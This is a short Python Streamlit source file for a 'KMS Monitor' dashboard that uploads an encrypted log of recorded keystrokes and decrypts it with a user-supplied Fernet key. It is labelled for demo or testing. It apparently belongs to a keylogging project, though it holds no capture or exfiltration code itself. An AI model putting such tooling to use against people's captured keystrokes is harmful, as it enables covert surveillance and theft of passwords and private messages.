# dashboard/app.py
import streamlit as st
from utils.crypto import decrypt

st.set_page_config(page_title="KMS Monitor", layout="wide")

st.title("🖥️ KMS Monitor Dashboard")
st.write("Monitor and decrypt logged keystrokes (for demo/testing only).")

uploaded_file = st.file_uploader("Upload an encrypted log file", type=["txt"])

fernet_key = st.text_input("Enter Fernet key to decrypt", type="password")

if uploaded_file is not None:
    encrypted_data = uploaded_file.read()
    if fernet_key and st.button("Decrypt"):
        try:
            from cryptography.fernet import Fernet
            f = Fernet(fernet_key.encode())
            decrypted = f.decrypt(encrypted_data).decode()
            st.subheader("🔓 Decrypted Logs")
            st.text_area("Logs", decrypted, height=300)
        except Exception as e:
            st.error(f"Decryption failed: {e}")
    else:
        st.info("Enter Fernet key and click Decrypt to view contents.")
